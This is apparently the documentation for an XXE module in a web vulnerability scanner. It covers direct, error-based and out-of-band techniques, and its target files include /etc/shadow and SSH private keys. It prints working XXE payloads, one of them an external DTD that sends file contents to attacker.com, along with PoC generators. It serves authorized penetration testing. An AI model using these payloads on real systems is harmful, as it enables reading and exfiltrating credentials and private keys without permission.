# XXE (XML External Entity) Module

## Overview

The XXE module provides automated testing and exploitation of XML External Entity vulnerabilities. It supports multiple XXE techniques including direct file reading, error-based exfiltration, and out-of-band (OOB) data exfiltration via HTTP and DNS callbacks.

## Features

### XXE Testing Techniques

1. **Direct XXE**
   - Injects external entity declarations to read local files
   - Detects file content directly in HTTP responses
   - Highest confidence when successful

2. **Error-Based XXE**
   - Triggers XML parsing errors that leak file content
   - Useful when direct output is filtered
   - Analyzes error messages for exfiltrated data

3. **Blind XXE with HTTP OOB**
   - Uses HTTP callbacks to exfiltrate data when no direct output exists
   - Integrates with OOB Listener for callback correlation
   - Supports file content exfiltration via HTTP requests

4. **Blind XXE with DNS OOB**
   - Uses DNS queries to confirm XXE and exfiltrate small amounts of data
   - Works even when HTTP egress is blocked
   - Integrates with OOB Listener for DNS query logging

### Target Files

The module automatically tests common sensitive files:

**Unix/Linux:**
- `/etc/passwd` - User account information
- `/etc/shadow` - Password hashes (requires root)
- `/etc/hosts` - Host name mappings
- `/proc/self/environ` - Environment variables
- `/root/.ssh/id_rsa` - SSH private keys
- `/var/log/apache2/access.log` - Web server logs
- Application configuration files

**Windows:**
- `C:\Windows\win.ini` - Windows configuration
- `C:\Windows\System32\drivers\etc\hosts` - Host mappings
- `C:\boot.ini` - Boot configuration
- `C:\inetpub\wwwroot\web.config` - IIS configuration

## Usage

### Basic XXE Testing

```python
from app.modules.xxe import XXETester, InjectionPoint
from app.core.request_handler import RequestHandler
from app.core.oob_listener import OOBListener

# Initialize components
request_handler = RequestHandler()
oob_listener = OOBListener()
await oob_listener.start()

# Create XXE tester
xxe_tester = XXETester(
    request_handler=request_handler,
    oob_listener=oob_listener
)

# Define injection point
injection_point = InjectionPoint(
    parameter="xml_data",
    location="body",
    original_value="<root>test</root>",
    url="https://target.com/api/parse",
    method="POST",
    headers={"Content-Type": "application/xml"}
)

# Test for XXE
results = await xxe_tester.test_injection_point(injection_point)

# Check results
for result in results:
    if result.is_vulnerable:
        print(f"XXE found! Type: {result.xxe_type.value}")
        print(f"Target file: {result.target_file}")
        print(f"Exfiltrated data: {result.exfiltrated_data}")
```

### Testing Specific Files

```python
# Test specific files
target_files = [
    "/etc/passwd",
    "/var/www/html/config.php",
    "C:\\Windows\\win.ini"
]

results = await xxe_tester.test_injection_point(
    injection_point,
    target_files=target_files
)
```

### Testing Specific Techniques

```python
from app.modules.xxe import XXEType

# Test only OOB techniques
results = await xxe_tester.test_injection_point(
    injection_point,
    techniques=[XXEType.BLIND_OOB_HTTP, XXEType.BLIND_OOB_DNS]
)
```

### Generating Proof-of-Concept

```python
from app.modules.xxe import XXEPoCGenerator

# Generate PoC from successful result
poc_generator = XXEPoCGenerator(result)

# Generate XML payload
poc_payload = poc_generator.generate_poc("/etc/shadow")
print(poc_payload)

# Generate curl command
curl_cmd = poc_generator.generate_curl_command()
print(curl_cmd)

# Generate Python script
python_script = poc_generator.generate_python_script()
print(python_script)
```

## XXE Payload Examples

### Direct XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Error-Based XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo>test</foo>
```

### OOB XXE (HTTP)

Main payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>
```

External DTD (xxe.dtd):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

## Detection Indicators

The module looks for these indicators of successful XXE:

1. **File Content Patterns:**
   - `root:x:0:0:` - /etc/passwd entries
   - `[boot loader]` - Windows boot.ini
   - `[extensions]` - Windows win.ini
   - `127.0.0.1 localhost` - /etc/hosts

2. **Response Changes:**
   - Significant length differences from baseline
   - New content not present in baseline response
   - XML parsing errors with file paths

3. **OOB Callbacks:**
   - HTTP requests to OOB listener
   - DNS queries to OOB domain
   - Decoded file content in callback data

## Integration with OOB Listener

The XXE module integrates seamlessly with the OOB Listener:

1. **Payload Registration:** Each OOB payload is registered with a unique ID
2. **Callback Correlation:** Incoming callbacks are matched to payloads
3. **Data Decoding:** Exfiltrated data is automatically decoded (URL, Base64, Hex)
4. **Real-time Monitoring:** Callbacks are captured and logged in real-time

## Requirements Validation

This module implements the following requirements:

- **Requirement 9.1:** Inject XML payloads with external entity declarations
- **Requirement 9.2:** Construct OOB payloads for file exfiltration
- **Requirement 9.3:** Integrate with OOB Listener for callback correlation
- **Requirement 9.4:** Generate XXE PoC in web UI
- **Requirement 9.5:** Target common sensitive files

## Security Considerations

**For Authorized Testing Only:**
- XXE testing should only be performed on systems you own or have explicit permission to test
- XXE can read sensitive files and potentially execute code
- Always obtain proper authorization before testing

**Safe Testing Practices:**
- Start with less sensitive files (e.g., /etc/hostname)
- Use OOB techniques to minimize impact
- Monitor for unintended side effects
- Document all testing activities

## Limitations

1. **XML Parser Requirements:**
   - Target must parse XML input
   - External entities must be enabled
   - Some parsers disable external entities by default

2. **File Access:**
   - Can only read files accessible to the application user
   - File permissions may prevent access to sensitive files
   - Some files may be too large to exfiltrate

3. **Network Restrictions:**
   - OOB techniques require outbound network access
   - Firewalls may block HTTP/DNS egress
   - DNS OOB limited to small data amounts

## Troubleshooting

**No XXE Detected:**
- Verify target accepts XML input
- Check if external entities are disabled
- Try different injection points (body, parameters, headers)
- Test with simpler payloads first

**OOB Callbacks Not Received:**
- Verify OOB Listener is running
- Check firewall rules allow inbound connections
- Ensure DNS server is accessible
- Verify domain resolves correctly

**Partial Data Exfiltration:**
- File may be too large for single request
- Try smaller files first
- Use chunking techniques for large files
- Check for data encoding issues

## References

- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [XXE Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
